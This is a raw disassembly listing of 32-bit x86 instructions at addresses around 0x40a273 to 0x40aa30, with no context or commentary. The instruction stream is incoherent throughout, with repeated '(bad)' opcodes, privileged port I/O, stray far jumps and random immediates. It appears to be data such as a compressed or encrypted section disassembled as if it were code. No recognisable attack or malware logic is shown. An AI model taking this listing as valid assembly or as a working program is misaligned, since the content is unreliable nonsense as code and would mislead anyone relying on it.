  40a273:	or     DWORD PTR [ebx+0x5e],esi
  40a276:	xor    eax,0x1c4064ae
  40a27b:	lock lock inc esi
  40a27e:	sub    al,0x49
  40a280:	jbe    0x40a21f
  40a282:	jle    0x40a2c7
  40a284:	pusha  
  40a285:	cwde   
  40a286:	jge    0x40a2ec
  40a288:	push   ebx
  40a289:	dec    ebx
  40a28a:	gs push edi
  40a28c:	jb     0x40a241
  40a28e:	and    al,BYTE PTR [edi+0x3f238949]
  40a294:	mov    dl,0x23
  40a296:	icebp  
  40a297:	out    0x85,eax
  40a299:	sbb    eax,esp
  40a29b:	test   al,0x95
  40a29d:	push   cs
  40a29e:	(bad)  
  40a29f:	repz xchg edx,eax
  40a2a1:	cdq    
  40a2a2:	xor    eax,eax
  40a2a4:	leave  
  40a2a5:	xor    DWORD PTR fs:[esi-0x279a6ae5],0x290cf538
  40a2b0:	jge    0x40a241
  40a2b2:	or     BYTE PTR [esp+eiz*8],bh
  40a2b5:	inc    edi
  40a2b6:	adc    al,0x91
  40a2b8:	das    
  40a2b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2ba:	adc    eax,0xe45ccc0b
  40a2bf:	inc    eax
  40a2c0:	mov    ch,ah
  40a2c2:	scas   eax,DWORD PTR es:[edi]
  40a2c3:	mov    al,0x76
  40a2c5:	jp     0x40a2dc
  40a2c7:	inc    ebp
  40a2c8:	push   edi
  40a2c9:	push   esp
  40a2ca:	pop    ebp
  40a2cb:	sub    DWORD PTR [edi-0x41f5513a],eax
  40a2d1:	xor    BYTE PTR [esi+ebx*2+0x12f7d5e4],bh
  40a2d8:	arpl   si,ax
  40a2da:	lods   al,BYTE PTR ds:[esi]
  40a2db:	shl    DWORD PTR [ebx-0xf],1
  40a2de:	cmp    eax,0x64ef839f
  40a2e3:	mov    gs,WORD PTR [edx+0x6edd0820]
  40a2e9:	jne    0x40a2e8
  40a2eb:	inc    ebp
  40a2ec:	push   es
  40a2ed:	in     eax,dx
  40a2ee:	pop    es
  40a2ef:	push   ebp
  40a2f0:	scas   al,BYTE PTR es:[edi]
  40a2f1:	mov    esi,0xf0342727
  40a2f6:	inc    ebp
  40a2f7:	mov    ds:0x5b8c8a51,eax
  40a2fc:	nop
  40a2fd:	pop    esp
  40a2fe:	(bad)
  40a302:	and    DWORD PTR [ebx-0x6b],edx
  40a305:	bound  edi,QWORD PTR [ebx-0x3a]
  40a308:	imul   edi,esi,0xffffffd0
  40a30b:	test   DWORD PTR [eax-0x1cafe21],esi
  40a311:	in     eax,0x24
  40a313:	das    
  40a314:	push   esp
  40a315:	adc    BYTE PTR [esi-0x36],al
  40a318:	xchg   BYTE PTR [edx],bh
  40a31a:	xchg   BYTE PTR [edi-0x1b9d842f],bl
  40a320:	mov    ch,0x60
  40a322:	mov    ecx,0x1e4210b0
  40a327:	je     0x40a354
  40a329:	sub    al,0x1c
  40a32b:	ss aaa 
  40a32d:	mov    ebx,0x45c78e64
  40a332:	mov    al,ds:0x92252514
  40a337:	push   0x85ed9b5e
  40a33c:	xchg   BYTE PTR [eax+0xbc75afe],dl
  40a342:	enter  0x93ef,0x4
  40a346:	test   BYTE PTR [ebx],0xca
  40a349:	xchg   DWORD PTR [ebx],eax
  40a34b:	popf   
  40a34c:	pop    ss
  40a34d:	aad    0x63
  40a34f:	fs popa 
  40a351:	nop
  40a352:	ret    
  40a353:	cld    
  40a354:	mov    ecx,0xa5ab8770
  40a359:	sbb    BYTE PTR [eax-0x80],bh
  40a35c:	xchg   ebp,eax
  40a35d:	dec    ecx
  40a35e:	ins    DWORD PTR es:[edi],dx
  40a35f:	jl     0x40a3d6
  40a361:	sub    ah,BYTE PTR [edx-0x310b3e92]
  40a367:	dec    esp
  40a368:	and    eax,0xc9816d30
  40a36d:	mov    DWORD PTR [ecx],ebp
  40a36f:	push   0xffffffc9
  40a371:	repnz sbb dh,al
  40a374:	pushf  
  40a375:	pop    ebp
  40a376:	fimul  WORD PTR [ecx+0x65]
  40a379:	jb     0x40a326
  40a37b:	inc    esi
  40a37c:	pushf  
  40a37d:	aam    0xad
  40a37f:	mov    edx,0xe67881ad
  40a384:	bound  esi,QWORD PTR [eax-0x6d3d8031]
  40a38a:	mov    eax,ds:0xfb0ea5f1
  40a38f:	mov    al,0x8b
  40a391:	xchg   esi,eax
  40a392:	test   BYTE PTR [ebx],ch
  40a394:	xchg   edx,eax
  40a395:	imul   esi,esi,0xffffffc9
  40a398:	sar    edi,0xea
  40a39b:	lock and DWORD PTR [ebx],esp
  40a39e:	sbb    DWORD PTR [edx],edi
  40a3a0:	mov    al,BYTE PTR [esi+0x38]
  40a3a3:	xlat   BYTE PTR ds:[ebx]
  40a3a4:	inc    edx
  40a3a5:	retf   0x38f0
  40a3a8:	sar    ecx,0xc9
  40a3ab:	imul   DWORD PTR [ecx]
  40a3ad:	dec    eax
  40a3ae:	mov    esp,0x68b5b22a
  40a3b3:	fstp   TBYTE PTR [edx-0x69]
  40a3b6:	sub    al,0xa2
  40a3b8:	sub    cl,al
  40a3ba:	fs mov ebx,0x3ab0c6c0
  40a3c0:	push   cs
  40a3c1:	mov    ah,0x70
  40a3c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3c4:	xor    ch,al
  40a3c6:	aad    0x11
  40a3c8:	mov    al,0x2d
  40a3ca:	sub    al,0x67
  40a3cc:	mov    eax,0x148e4898
  40a3d1:	in     al,0x8b
  40a3d3:	std    
  40a3d4:	shl    BYTE PTR [ebx-0x74],1
  40a3d7:	inc    BYTE PTR [esi-0x32]
  40a3da:	lods   al,BYTE PTR ds:[esi]
  40a3db:	xchg   BYTE PTR [edi-0xa5ff299],al
  40a3e1:	xor    BYTE PTR [ebx+0x9c46b6],cl
  40a3e7:	jmp    0x7e9f:0xbabff645
  40a3ee:	loop   0x40a450
  40a3f0:	fcom   QWORD PTR [edx-0x6bdc8d5a]
  40a3f6:	add    esi,DWORD PTR cs:[esi+0x5c]
  40a3fa:	xchg   edi,eax
  40a3fb:	std    
  40a3fc:	jne    0x40a39e
  40a3fe:	mov    BYTE PTR [ebp-0x11],cl
  40a401:	or     al,ah
  40a403:	mov    DWORD PTR [edx-0x164a9bf],esp
  40a409:	dec    esp
  40a40a:	xor    al,BYTE PTR [ecx]
  40a40c:	mov    dh,BYTE PTR ds:0x19ec5c20
  40a412:	jmp    0xa3cd:0xea071d44
  40a419:	add    al,0xe0
  40a41b:	push   esi
  40a41c:	mov    dl,0x5e
  40a41e:	sub    DWORD PTR [ecx+0x47],edi
  40a421:	or     DWORD PTR [ecx-0x61e161b],esi
  40a427:	mov    ebp,0xc7e738b9
  40a42c:	and    al,0x4f
  40a42e:	jge    0x40a411
  40a430:	pop    esp
  40a431:	adc    eax,0x1f0b1303
  40a436:	cmp    DWORD PTR [ecx],ebp
  40a438:	stos   DWORD PTR es:[edi],eax
  40a439:	jmp    0xb96fc448
  40a43e:	jae    0x40a46e
  40a440:	nop
  40a441:	lahf   
  40a442:	xor    al,BYTE PTR [ecx]
  40a444:	inc    edx
  40a445:	ins    DWORD PTR es:[edi],dx
  40a446:	retf   0xf04f
  40a449:	stc    
  40a44a:	pushf  
  40a44b:	mov    esi,0x554ace52
  40a450:	mov    edx,0x1ad74b
  40a455:	cmp    eax,0xdf02d58a
  40a45a:	sub    al,0xc8
  40a45c:	cmp    al,0xce
  40a45e:	cli    
  40a45f:	mov    cl,0x6b
  40a461:	retf   
  40a462:	call   0x3dde:0xe59e43af
  40a469:	sti    
  40a46a:	(bad)  
  40a46b:	jmp    0x40a479
  40a46d:	mov    esp,0x2fd0d76b
  40a472:	test   DWORD PTR [ecx-0x69],ebp
  40a475:	in     al,0x9c
  40a477:	aad    0xaf
  40a479:	sbb    bh,BYTE PTR [esi]
  40a47b:	mov    ?,WORD PTR [esi+0x56]
  40a47e:	push   ss
  40a47f:	jae    0x40a4d4
  40a481:	into   
  40a482:	in     al,0x4f
  40a484:	xor    eax,DWORD PTR [ebx+0xb4dbdb6]
  40a48a:	sbb    eax,esp
  40a48c:	adc    BYTE PTR [ebx],ah
  40a48e:	xchg   ebx,eax
  40a48f:	jmp    0x40a510
  40a491:	in     al,0xca
  40a493:	mov    dl,0x98
  40a495:	pop    ebx
  40a496:	adc    al,0x10
  40a498:	jmp    0x40a4cc
  40a49a:	outs   dx,DWORD PTR ds:[esi]
  40a49b:	adc    DWORD PTR [eax-0x72],ebx
  40a49e:	xor    eax,0xf61828c9
  40a4a3:	mov    bh,0xaa
  40a4a5:	pop    ds
  40a4a6:	arpl   ax,cx
  40a4a8:	cmp    ebx,ecx
  40a4aa:	mov    al,bh
  40a4ac:	cld    
  40a4ad:	sti    
  40a4ae:	mov    cl,BYTE PTR [edi+0x1fad87ac]
  40a4b4:	push   ecx
  40a4b5:	lahf   
  40a4b6:	push   0x9ee284c6
  40a4bb:	or     dl,BYTE PTR [esi+edx*8-0x3414a393]
  40a4c2:	das    
  40a4c3:	adc    esi,DWORD PTR [eax-0x1af6b94b]
  40a4c9:	adc    eax,0xf0be2a53
  40a4ce:	push   0x9780b013
  40a4d3:	jmp    0x40a4da
  40a4d5:	cmp    BYTE PTR [ebx-0x28],cl
  40a4d8:	sub    eax,0x5747276a
  40a4dd:	mov    ecx,0xba2b4e10
  40a4e2:	ja     0x40a46f
  40a4e4:	mov    bh,0x43
  40a4e7:	mov    edx,edx
  40a4e9:	adc    ebx,DWORD PTR [edx]
  40a4eb:	mov    ss,WORD PTR [edi-0x75]
  40a4ee:	in     al,dx
  40a4ef:	sub    al,0xd7
  40a4f1:	test   BYTE PTR [esi],ah
  40a4f3:	mov    ebx,0x4bb7641d
  40a4f8:	pop    ss
  40a4f9:	and    al,0xfe
  40a4fb:	cmc    
  40a4fc:	cld    
  40a4fd:	xchg   BYTE PTR [ecx],ah
  40a4ff:	lea    ecx,[edi-0x5a026b82]
  40a505:	imul   esi,DWORD PTR [eax-0x2e],0x3e115c9f
  40a50c:	in     al,dx
  40a50d:	rcl    DWORD PTR [edx-0x55],0xbe
  40a511:	push   edi
  40a512:	in     eax,0xe4
  40a514:	retf   
  40a515:	pop    ss
  40a516:	loope  0x40a4ab
  40a518:	fsubr  st,st(1)
  40a51a:	in     eax,dx
  40a51b:	and    DWORD PTR [eax-0x5],ebp
  40a51e:	(bad)  
  40a520:	ja     0x40a593
  40a522:	aas    
  40a523:	lds    edx,FWORD PTR [edi]
  40a525:	ret    0x2da9
  40a528:	loopne 0x40a4c4
  40a52a:	stc    
  40a52b:	or     ch,bl
  40a52d:	and    al,0x97
  40a52f:	daa    
  40a530:	aad    0xb4
  40a532:	hlt    
  40a533:	(bad)  
  40a534:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a535:	cs int3 
  40a537:	jmp    0x40a4ea
  40a539:	jne    0x40a54a
  40a53b:	cmp    edx,DWORD PTR [ebp+0x21dafe34]
  40a541:	popf   
  40a542:	pop    esi
  40a543:	scas   al,BYTE PTR es:[edi]
  40a544:	fsub   DWORD PTR ds:0x5d6ea702
  40a54a:	stos   DWORD PTR es:[edi],eax
  40a54b:	add    al,0xc2
  40a54d:	and    BYTE PTR [edi+0x31],ch
  40a550:	mov    ebx,0xc53e3556
  40a555:	mov    gs,edx
  40a557:	xlat   BYTE PTR ds:[ebx]
  40a558:	push   ebx
  40a559:	nop
  40a55a:	or     dl,BYTE PTR ds:0xb42d5d9
  40a560:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a561:	jle    0x40a5d1
  40a563:	adc    edi,esi
  40a565:	iret   
  40a566:	jns    0x40a555
  40a568:	in     al,dx
  40a569:	jmp    0xafc1:0xac6f6d98
  40a570:	or     eax,0xfc97fa4
  40a575:	pop    ebp
  40a576:	cmp    BYTE PTR [ebx-0x22],dl
  40a579:	adc    esp,ecx
  40a57b:	xchg   ecx,eax
  40a57c:	lea    esi,fs:0xf8588298
  40a583:	shl    ecx,1
  40a585:	pop    esp
  40a586:	js     0x40a55c
  40a588:	int    0xa5
  40a58a:	xchg   al,ah
  40a58c:	push   ds
  40a58d:	and    ebp,edi
  40a58f:	cmp    BYTE PTR [edx+edi*8-0x4e2c77e],ch
  40a596:	sub    al,0x75
  40a598:	mov    bh,BYTE PTR [ebp-0x79]
  40a59b:	xor    ebx,ebp
  40a59d:	scas   eax,DWORD PTR es:[edi]
  40a59e:	inc    esi
  40a59f:	test   eax,0xa96045ad
  40a5a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5a5:	dec    eax
  40a5a6:	cmp    BYTE PTR [edx],dh
  40a5a8:	(bad)  
  40a5a9:	jmp    0xb65a:0x9a60cd34
  40a5b0:	call   0xe488:0xa37fe69e
  40a5b7:	xlat   BYTE PTR ds:[ebx]
  40a5b8:	mov    bl,0x14
  40a5ba:	jmp    0xefdfe24
  40a5bf:	rcl    BYTE PTR [ebx-0x60],cl
  40a5c2:	shl    BYTE PTR ds:0xc5fb5ad9,cl
  40a5c8:	cli    
  40a5c9:	and    eax,0x33ab1d22
  40a5ce:	mov    eax,0xffcf7303
  40a5d3:	gs in  al,0xe6
  40a5d6:	xchg   edx,eax
  40a5d7:	add    ah,BYTE PTR [edi+0x8cdc80d]
  40a5dd:	sub    bl,BYTE PTR [ecx+0x6c]
  40a5e0:	fidiv  WORD PTR [eax+0x1]
  40a5e3:	xor    ebx,DWORD PTR [ecx-0x37]
  40a5e6:	fs pop ss
  40a5e8:	ja     0x40a5e8
  40a5ea:	push   es
  40a5eb:	jne    0x40a573
  40a5ed:	lea    ebx,[ebp+0x18f4d699]
  40a5f3:	add    eax,0xec2d8f5a
  40a5f8:	ins    BYTE PTR es:[edi],dx
  40a5f9:	inc    eax
  40a5fa:	rcl    DWORD PTR [edi-0x1c610aba],cl
  40a600:	dec    ecx
  40a601:	ins    DWORD PTR es:[edi],dx
  40a602:	add    ch,BYTE PTR [ebp+0x46]
  40a605:	aad    0x7
  40a607:	jp     0x40a604
  40a609:	stos   DWORD PTR es:[edi],eax
  40a60a:	and    dh,ah
  40a60c:	(bad)  
  40a60d:	push   cs
  40a60e:	pop    ecx
  40a60f:	sbb    DWORD PTR [edx],esi
  40a611:	(bad)  
  40a612:	es iret 
  40a614:	dec    esi
  40a615:	fwait
  40a616:	sbb    BYTE PTR ss:[eax],bl
  40a619:	jo     0x40a68e
  40a61b:	adc    ah,BYTE PTR [ebx-0x70]
  40a61e:	ja     0x40a642
  40a620:	add    cl,BYTE PTR [edi-0x53]
  40a623:	jecxz  0x40a685
  40a625:	ds fwait
  40a627:	pop    ds
  40a628:	call   0x9f8d:0xe0d3f955
  40a62f:	jmp    0xa7dc7caf
  40a634:	in     eax,0x13
  40a636:	inc    esi
  40a637:	call   0xc7b736c8
  40a63c:	or     esi,esp
  40a63e:	ror    esi,cl
  40a640:	push   cs
  40a641:	mov    DWORD PTR [ebx+0x2f],ecx
  40a644:	push   esi
  40a645:	addr16 imul ebp,ebx,0x8d02a478
  40a64c:	ret    
  40a64d:	in     al,dx
  40a64e:	cmp    esi,DWORD PTR [ebx+0x6bbf6726]
  40a654:	cli    
  40a655:	mov    bl,0xea
  40a657:	sbb    al,0x6d
  40a659:	repz call 0x5549904
  40a65f:	mov    esi,DWORD PTR [ebp-0x69]
  40a662:	jge    0x40a673
  40a664:	(bad)  
  40a665:	repnz fild WORD PTR [esi+0x3530dfc3]
  40a66c:	cmp    al,0x17
  40a66e:	pop    esp
  40a66f:	jns    0x40a5f5
  40a671:	xor    eax,0xcc1ee3d8
  40a676:	cwde   
  40a677:	neg    BYTE PTR [ebx+0x2420abb6]
  40a67d:	fadd   QWORD PTR [ebx+0xc]
  40a680:	ja     0x40a678
  40a682:	push   eax
  40a683:	pop    es
  40a684:	cmp    DWORD PTR [eax],eax
  40a686:	popa   
  40a687:	xchg   edx,eax
  40a688:	push   ss
  40a689:	cmp    bl,dh
  40a68b:	fisubr DWORD PTR ss:[eax]
  40a68e:	cwde   
  40a68f:	in     eax,dx
  40a690:	fwait
  40a691:	pushf  
  40a692:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a693:	mov    ebx,0xabcc5150
  40a698:	fst    QWORD PTR [esi+0x58]
  40a69b:	dec    eax
  40a69c:	jnp    0x40a630
  40a69e:	mov    ds:0x73c367d9,al
  40a6a3:	mov    al,ds:0x46744106
  40a6a8:	pop    ecx
  40a6a9:	sub    BYTE PTR [eax],0x3f
  40a6ac:	mov    eax,0xc80d4bb8
  40a6b1:	sub    eax,0xcdb4a030
  40a6b6:	loopne 0x40a65c
  40a6b8:	xchg   BYTE PTR [eax],bl
  40a6ba:	jg     0x40a6cb
  40a6bc:	xchg   BYTE PTR [edi-0x2b],ch
  40a6bf:	test   eax,0x8a2d9dde
  40a6c4:	or     eax,0x9deb05c7
  40a6c9:	pop    ebx
  40a6ca:	jb     0x40a709
  40a6cc:	rcl    BYTE PTR ds:0xdab9ce51,0x6
  40a6d3:	ja     0x40a6ab
  40a6d5:	dec    eax
  40a6d6:	jae    0x40a65a
  40a6d8:	adc    DWORD PTR [esp+0x90b215c],ebp
  40a6df:	test   al,0xf8
  40a6e1:	loop   0x40a755
  40a6e3:	mov    ds:0x533c8948,eax
  40a6e8:	ficomp WORD PTR [ebx]
  40a6ea:	fiadd  WORD PTR [eax+0x5d]
  40a6ed:	mov    esp,DWORD PTR [eax-0x596067c9]
  40a6f3:	push   eax
  40a6f4:	push   ecx
  40a6f5:	dec    eax
  40a6f6:	stos   BYTE PTR es:[edi],al
  40a6f7:	inc    eax
  40a6f8:	jo     0x40a67d
  40a6fa:	add    al,0x79
  40a6fc:	xchg   ecx,eax
  40a6fd:	mov    cl,BYTE PTR ds:0x7d9913d7
  40a703:	sub    eax,0xffffffe6
  40a706:	add    bh,BYTE PTR [ebx+0x57]
  40a709:	mov    ecx,0xe2e383f1
  40a70e:	adc    ebp,DWORD PTR [edi+eiz*2-0x3ec33d49]
  40a715:	scas   al,BYTE PTR es:[edi]
  40a716:	das    
  40a717:	mov    BYTE PTR [eax],cl
  40a719:	mov    dl,0x3e
  40a71b:	xor    ah,bh
  40a71d:	test   ebx,ecx
  40a71f:	adc    esi,DWORD PTR [esi-0x196f5739]
  40a725:	in     al,0xaf
  40a727:	int    0x67
  40a729:	rcl    bl,0x3d
  40a72c:	je     0x40a79e
  40a72e:	xor    BYTE PTR [ecx+0x3b172d98],ch
  40a734:	add    eax,0x2d237ea1
  40a739:	push   ds
  40a73a:	push   ebp
  40a73b:	and    eax,0x6203c857
  40a740:	shl    DWORD PTR [eax-0x3c8207e9],1
  40a746:	or     ecx,DWORD PTR [eax+0x33]
  40a749:	shl    esp,1
  40a74b:	cmp    BYTE PTR [edi+esi*1],dl
  40a74e:	outs   dx,BYTE PTR ds:[esi]
  40a74f:	test   al,0x47
  40a751:	arpl   WORD PTR [esi],bp
  40a753:	sti    
  40a754:	lds    esp,FWORD PTR [eax+0x3b70e86f]
  40a75a:	jmp    0xda98a414
  40a75f:	adc    ah,BYTE PTR [eax-0x799ee685]
  40a765:	and    al,0x9b
  40a767:	xor    ch,BYTE PTR [esi]
  40a769:	rcr    dl,1
  40a76b:	ins    BYTE PTR es:[edi],dx
  40a76c:	or     DWORD PTR [eax-0x74322456],ebx
  40a772:	fnstenv [ebx]
  40a774:	imul   ecx,DWORD PTR [ebx],0x7bc87510
  40a77a:	jle    0x40a792
  40a77c:	fdivrp st(0),st
  40a77e:	pop    ecx
  40a77f:	adc    DWORD PTR [ebx-0x31015a09],edi
  40a785:	sbb    eax,0xf12a4c0d
  40a78a:	pop    ecx
  40a78b:	inc    eax
  40a78c:	jecxz  0x40a774
  40a78e:	retf   0x6c9
  40a791:	in     eax,0x7
  40a793:	in     al,0xd1
  40a795:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a796:	aaa    
  40a797:	push   edi
  40a798:	mov    esi,0x4f121d45
  40a79d:	and    dh,BYTE PTR [ebx]
  40a79f:	fwait
  40a7a0:	enter  0x36d2,0xc7
  40a7a4:	jmp    0x40a72a
  40a7a6:	sub    eax,DWORD PTR [edi-0x7680553b]
  40a7ac:	fsubr  DWORD PTR [ebp+0x7f]
  40a7af:	xchg   BYTE PTR [edi+ebx*8],ah
  40a7b2:	shl    edx,cl
  40a7b4:	call   0x958d:0x31a3382f
  40a7bb:	sahf   
  40a7bc:	ret    
  40a7bd:	call   0xb775:0x726f5b0e
  40a7c4:	cli    
  40a7c5:	and    BYTE PTR [ebp+0x4758ee9c],bh
  40a7cb:	add    esi,ebx
  40a7cd:	push   0xffffffb0
  40a7cf:	mov    ch,0x5d
  40a7d1:	je     0x40a7c4
  40a7d3:	xor    al,0xe8
  40a7d5:	cmp    ecx,DWORD PTR [eax+0x54de3bf9]
  40a7db:	push   edx
  40a7dc:	clc    
  40a7dd:	inc    ebx
  40a7de:	jmp    0xc2651965
  40a7e3:	addr16 sbb edi,esp
  40a7e6:	cmp    DWORD PTR [ecx],0xc758a403
  40a7ec:	dec    ebp
  40a7ed:	inc    ebx
  40a7ee:	arpl   WORD PTR [edx],bp
  40a7f0:	push   esi
  40a7f1:	or     ch,BYTE PTR [ebp-0x227b90]
  40a7f7:	ss mov al,0x8e
  40a7fa:	test   al,0x44
  40a7fc:	mov    esi,0x7ef95d2f
  40a801:	ja     0x40a849
  40a803:	shr    cl,cl
  40a805:	in     al,0xcd
  40a807:	jg     0x40a886
  40a809:	ja     0x40a7ee
  40a80b:	retf   0x8803
  40a80e:	out    dx,eax
  40a80f:	es sahf 
  40a811:	lods   eax,DWORD PTR ds:[esi]
  40a812:	jbe    0x40a849
  40a814:	stos   BYTE PTR es:[edi],al
  40a815:	add    DWORD PTR ds:0xb6491214,ebp
  40a81b:	sbb    DWORD PTR [ebp-0x49],ebx
  40a81e:	xor    DWORD PTR [eax],ebp
  40a820:	mov    ah,BYTE PTR [ebx+0x3f252a28]
  40a826:	pop    es
  40a827:	push   eax
  40a828:	jmp    0x40a819
  40a82a:	xor    esi,DWORD PTR [ecx+esi*2+0x39]
  40a82e:	in     eax,0x7a
  40a830:	jnp    0x40a7b9
  40a832:	push   edx
  40a833:	(bad)  
  40a834:	mov    dl,0x81
  40a836:	push   0xffffffdf
  40a838:	pop    edx
  40a839:	push   esp
  40a83a:	out    dx,eax
  40a83b:	imul   esp,DWORD PTR [esp+ecx*2-0x6e],0x5
  40a840:	push   ss
  40a841:	loop   0x40a857
  40a843:	(bad)  
  40a844:	push   eax
  40a845:	pop    ecx
  40a846:	retf   0xe019
  40a849:	fs fdivr st,st(3)
  40a84c:	jl     0x40a878
  40a84e:	mov    BYTE PTR [edi-0x239a571f],bl
  40a854:	or     eax,0xdb533f6e
  40a859:	jl     0x40a8a3
  40a85b:	gs push ebp
  40a85d:	push   cs
  40a85e:	sub    al,0x8c
  40a860:	gs dec eax
  40a862:	and    dh,bh
  40a864:	fisttp DWORD PTR [ecx+0x5d]
  40a867:	push   0xffffffb3
  40a869:	xor    al,0x35
  40a86b:	cs and al,0xc4
  40a86e:	fwait
  40a86f:	jns    0x40a851
  40a871:	push   ecx
  40a872:	jle    0x40a819
  40a874:	inc    edi
  40a875:	push   edi
  40a876:	enter  0xd56f,0xf4
  40a87a:	sbb    ch,ch
  40a87c:	mov    cl,0xf
  40a87e:	push   es
  40a87f:	mov    ds:0xfbd5e4e2,eax
  40a884:	mov    WORD PTR [ebx-0x6efd3df1],fs
  40a88a:	add    edx,ebp
  40a88c:	in     al,dx
  40a88d:	test   BYTE PTR [ebx-0xa6cbfec],bl
  40a893:	shr    BYTE PTR [edx],0xef
  40a896:	mov    bl,0xb9
  40a898:	xlat   BYTE PTR ds:[ebx]
  40a899:	or     al,0xcd
  40a89b:	enter  0xb451,0x47
  40a89f:	hlt    
  40a8a0:	mov    dh,0x24
  40a8a2:	out    0xdb,al
  40a8a4:	add    eax,0x2eeab580
  40a8a9:	pop    ss
  40a8aa:	enter  0xd488,0x38
  40a8ae:	fs inc ecx
  40a8b0:	adc    esp,DWORD PTR [esi]
  40a8b2:	cmc    
  40a8b3:	xchg   ebx,eax
  40a8b4:	pop    ebp
  40a8b5:	fld    TBYTE PTR [edx+0x21]
  40a8b8:	fsubp  st(6),st
  40a8ba:	and    DWORD PTR [esi-0x571d366e],edx
  40a8c0:	sahf   
  40a8c1:	mov    esi,0x16ce5aa
  40a8c6:	mov    DWORD PTR [esi+0x2],ebx
  40a8c9:	test   BYTE PTR [esi],al
  40a8cb:	lahf   
  40a8cc:	fisubr WORD PTR [edi+edi*4-0x6214f1ad]
  40a8d3:	xchg   esi,eax
  40a8d4:	retf   0xe221
  40a8d7:	loop   0x40a894
  40a8d9:	mov    ebp,0xd1698f44
  40a8de:	jns    0x40a8ca
  40a8e0:	mov    ds:0x16cde31f,al
  40a8e5:	or     DWORD PTR [ebp-0x1555e482],ebp
  40a8eb:	mov    esp,0x4e426ee4
  40a8f0:	add    edx,DWORD PTR [esi+0xf67ee43]
  40a8f6:	in     eax,dx
  40a8f7:	sbb    BYTE PTR [ebx],dl
  40a8f9:	mov    ebx,0xe7f6a191
  40a8fe:	mov    ecx,0x3ad47e27
  40a903:	dec    eax
  40a904:	adc    edi,DWORD PTR [edx+0x56]
  40a907:	or     dl,BYTE PTR [ebx]
  40a909:	adc    eax,0x252b89bf
  40a90e:	pop    ebp
  40a90f:	mov    ds:0x3e4a417f,al
  40a914:	ja     0x40a946
  40a916:	lea    ecx,[ebx]
  40a918:	push   0x21
  40a91a:	sbb    edx,esi
  40a91c:	mov    ebx,0x72acec56
  40a921:	and    eax,0xb43bc97a
  40a926:	inc    ebp
  40a927:	or     dl,BYTE PTR [ebp*2-0x60d1bbf]
  40a92e:	push   ebx
  40a92f:	lds    eax,FWORD PTR [ecx]
  40a931:	jg     0x40a999
  40a933:	pop    ss
  40a934:	div    ecx
  40a936:	xchg   esi,eax
  40a937:	ret    0x4679
  40a93a:	mov    ?,WORD PTR [edi+0x7d]
  40a93d:	push   0xffffff92
  40a93f:	inc    edi
  40a940:	je     0x40a93d
  40a942:	sub    BYTE PTR [edi+0x28c6d881],cl
  40a948:	aas    
  40a949:	test   BYTE PTR [ebp+0xef6af28],ah
  40a94f:	out    0xf0,al
  40a951:	(bad)  
  40a952:	xor    eax,0x2df8a19c
  40a957:	mov    esi,0xd331fd3f
  40a95c:	outs   dx,DWORD PTR ds:[esi]
  40a95d:	add    eax,0xd93c547c
  40a962:	les    edi,FWORD PTR [edi+0x1]
  40a965:	lahf   
  40a966:	imul   eax,DWORD PTR [esi+0x143c0269],0x7434ca31
  40a970:	dec    esp
  40a971:	add    bh,BYTE PTR [esi-0x630c36fa]
  40a977:	mov    ebx,0xbc608431
  40a97c:	mov    dl,0x90
  40a97e:	jg     0x40a9cc
  40a980:	push   edi
  40a981:	cli    
  40a982:	mov    cl,0x39
  40a984:	(bad)  
  40a985:	sbb    BYTE PTR [esi-0x3c300847],dh
  40a98b:	retf   0xb032
  40a98e:	push   es
  40a98f:	jecxz  0x40a98c
  40a991:	scas   al,BYTE PTR es:[edi]
  40a992:	jle    0x40a9f0
  40a994:	(bad)  
  40a995:	leave  
  40a996:	lea    esi,[ecx+eax*2-0x2]
  40a99a:	imul   eax,DWORD PTR [eax+ecx*4-0x31e31ed6],0x16
  40a9a2:	pop    esp
  40a9a3:	jecxz  0x40a976
  40a9a5:	sub    dl,BYTE PTR [eax]
  40a9a7:	(bad)  
  40a9a9:	and    al,BYTE PTR [ecx+0x12]
  40a9ac:	sbb    BYTE PTR [esi],bl
  40a9ae:	inc    esi
  40a9af:	dec    edi
  40a9b0:	outs   dx,BYTE PTR ds:[esi]
  40a9b1:	mov    DWORD PTR [edx-0x7e],ecx
  40a9b4:	test   BYTE PTR [edx+ecx*1],bl
  40a9b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9b8:	mov    al,BYTE PTR [ecx]
  40a9ba:	imul   eax,DWORD PTR [ebx+eax*2],0xcd950e8
  40a9c1:	jmp    0xb8f88e2c
  40a9c6:	add    eax,0x1842add0
  40a9cb:	inc    edi
  40a9cc:	inc    ecx
  40a9cd:	push   0xffffff96
  40a9cf:	(bad)
  40a9d2:	xor    al,dh
  40a9d4:	scas   al,BYTE PTR es:[edi]
  40a9d5:	push   ebp
  40a9d6:	dec    ecx
  40a9d7:	cld    
  40a9d8:	pop    edx
  40a9d9:	ins    DWORD PTR es:[edi],dx
  40a9da:	mov    edx,0x5b5b232a
  40a9df:	add    esp,ecx
  40a9e1:	mov    edi,DWORD PTR [edi*8+0x2d5dd57]
  40a9e8:	sar    dh,cl
  40a9ea:	lock dec edi
  40a9ec:	mov    ecx,0xb02aaac1
  40a9f1:	mov    dl,dh
  40a9f3:	mov    es,WORD PTR [edx+0x37cdb5cf]
  40a9f9:	cmp    DWORD PTR [edx+0x39774e01],ebx
  40a9ff:	push   edi
  40aa00:	inc    esi
  40aa01:	loope  0x40aa3f
  40aa03:	ja     0x40aa57
  40aa05:	dec    eax
  40aa06:	stos   BYTE PTR es:[edi],al
  40aa07:	into   
  40aa08:	repz pop ecx
  40aa0a:	and    BYTE PTR [ebx+0x205e454],bh
  40aa10:	or     eax,0x40418308
  40aa15:	push   ebp
  40aa16:	repnz rcl eax,1
  40aa19:	or     edx,DWORD PTR [eax-0x6a]
  40aa1c:	dec    esi
  40aa1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa1e:	sbb    edx,ebp
  40aa20:	in     eax,0x3a
  40aa22:	xor    BYTE PTR [ebp-0x48],dh
  40aa25:	add    eax,0xb87b0e38
  40aa2a:	cmp    dh,BYTE PTR [ebp-0x33d5fcf3]
  40aa30:	sub    edi,DWORD PTR [ebx-0x67bc0c04]
